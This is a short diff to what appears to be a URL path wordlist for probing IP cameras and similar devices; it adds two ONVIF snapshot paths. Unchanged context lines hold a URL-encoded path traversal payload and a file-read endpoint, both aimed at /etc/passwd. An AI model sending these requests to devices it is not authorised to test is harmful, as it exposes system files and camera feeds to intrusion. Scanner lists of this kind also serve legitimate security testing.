@@ -6,3 +6,5 @@
 /Security/users?auth={{b64auth}}
 /CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 /cgi-bin/operator/fileread?READ.filePath=/etc/passwd
+/ONVIF/media.cgi?action=getSnapshot
+/ONVIF/media.cgi?action=getSnapshot&channel=1
